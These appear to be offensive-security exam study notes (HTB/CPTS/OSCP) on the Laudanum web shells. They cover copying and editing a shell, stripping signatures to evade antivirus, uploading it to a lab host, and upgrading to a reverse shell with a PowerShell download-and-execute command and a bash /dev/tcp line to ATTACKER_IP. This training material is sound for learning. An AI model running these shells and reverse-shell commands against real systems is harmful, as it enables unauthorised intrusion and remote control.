## 📦 What is Laudanum?

![Image](https://storage.googleapis.com/gweb-cloudblog-publish/images/china-chopper-one4.max-700x700.png)

![Image](https://cdn.prod.website-files.com/645a45d56fc4750d4edd96fe/65a8aca63663e691989b7aef_Web-Shells-BLOG.webp)

![Image](https://www.mdpi.com/futureinternet/futureinternet-12-00012/article_deploy/html/images/futureinternet-12-00012-g001.png)

![Image](https://cdn-blog.getastra.com/2024/04/ea8d6543-vapt-process.png)

### Definition (Important — Keep As It Is)

**Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.**

It contains web shells for multiple languages:

|Language|Extension|
|---|---|
|ASP|.asp|
|ASP.NET|.aspx|
|PHP|.php|
|JSP|.jsp|
|Perl|.pl|
|Shell|.sh|

---

## 📁 Laudanum Location (Important)

On Kali Linux / Parrot OS:

```bash
ls /usr/share/laudanum
```

Directory structure:

```id="ld2"
/usr/share/laudanum
├── asp
├── aspx
├── jsp
├── php
├── perl
└── shells
```

---

## ⚙️ How Laudanum Works

### Workflow Overview

|Step|Action|
|---|---|
|1|Copy Laudanum shell|
|2|Edit attacker IP|
|3|Upload shell to target|
|4|Access shell via browser|
|5|Execute commands|
|6|Upgrade to reverse shell|

---

## 📋 Step 1: Copy Laudanum Shell

Example (ASPX shell):

```bash
cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

---

## ✏️ Step 2: Modify Shell (VERY IMPORTANT)

Open file:

```bash
nano demo.aspx
```

Find this line:

```csharp
string[] allowedIps = { "127.0.0.1", "10.10.14.12" };
```

Add your attacker IP:

```csharp
string[] allowedIps = { "127.0.0.1", "10.10.14.12", "YOUR_ATTACKER_IP" };
```

### Why this is important:

- Restricts shell access to attacker only
    
- Prevents others from using your shell
    

---

## ⚠️ Important OPSEC Tip

Remove:

- ASCII art
    
- Comments
    
- Signatures
    

Why?

|Reason|Explanation|
|---|---|
|AV detection|Signature detection|
|IDS alerts|Known patterns|
|Stealth|Harder to detect|

---

## 📤 Step 3: Upload Web Shell

Example vulnerable upload page:

Upload:

```id="ld7"
demo.aspx
```

Upload result:

```id="ld8"
/files/demo.aspx
```

---

## 🌐 Step 4: Access Shell via Browser

Access URL:

```id="ld9"
http://status.inlanefreight.local/files/demo.aspx
```

Browser automatically cleans:

```id="ld10"
http://status.inlanefreight.local/files/demo.aspx
```

---

## 🖥️ Step 5: Execute Commands

Laudanum provides command input interface.

Example command:

```cmd
systeminfo
```

Example Linux command:

```bash
whoami
```

Output example:

```id="ld13"
Host Name: TARGET-SERVER
OS Name: Microsoft Windows Server
System Type: x64-based PC
```

---

## 🔥 What Laudanum Shell Can Do

|Capability|Example|
|---|---|
|Execute commands|systeminfo|
|File browsing|dir|
|User enumeration|whoami|
|Network enumeration|ipconfig|
|Privilege escalation|sudo -l|
|Reverse shell|bash reverse shell|

---

## 📡 Upgrade Laudanum → Reverse Shell

Listener:

```bash
nc -lvnp 4444
```

Execute in Laudanum shell:

```bash
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

Or Linux:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 📂 Common Upload Locations

|Server|Location|
|---|---|
|Apache|/var/www/html/files|
|IIS|C:\inetpub\wwwroot\files|
|Tomcat|/opt/tomcat/webapps|
|Nginx|/usr/share/nginx/html|

---

## 🎯 Laudanum Advantages

|Advantage|Explanation|
|---|---|
|Ready-made|No need to write shell|
|Multi-language|ASP, ASPX, PHP, JSP|
|Easy to use|Copy and upload|
|Reliable|Tested shells|
|Flexible|Reverse shell capable|

---

## ⚠️ Laudanum Limitations

|Limitation|Explanation|
|---|---|
|Needs upload vulnerability|Required|
|May be detected|AV signatures|
|Limited interaction|Browser-based|
|Runs as web user|Limited privileges|

---

## 🧠 Example Full Attack Flow

```id="ld17"
Find upload vulnerability
        ↓
Copy Laudanum shell
        ↓
Edit attacker IP
        ↓
Upload shell.aspx
        ↓
Access shell via browser
        ↓
Execute commands
        ↓
Upgrade to reverse shell
        ↓
Privilege escalation
```

---

## 🧰 Laudanum vs Custom Shell

|Feature|Laudanum|Custom shell|
|---|---|---|
|Ready to use|✅|❌|
|Stealth|❌|✅|
|Reliable|✅|Depends|
|Easy setup|✅|❌|

---

## 🧠 Exam Tips (HTB / CPTS / OSCP Important)

Memorize location:

```bash
/usr/share/laudanum
```

Most used shells:

```id="ld19"
shell.php
shell.aspx
shell.jsp
```

Upload → Access → Execute → Upgrade → PrivEsc

---

## 🏆 Most Important Commands

Copy shell:

```bash
cp /usr/share/laudanum/aspx/shell.aspx .
```

Listener:

```bash
nc -lvnp 4444
```

Reverse shell:

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

---

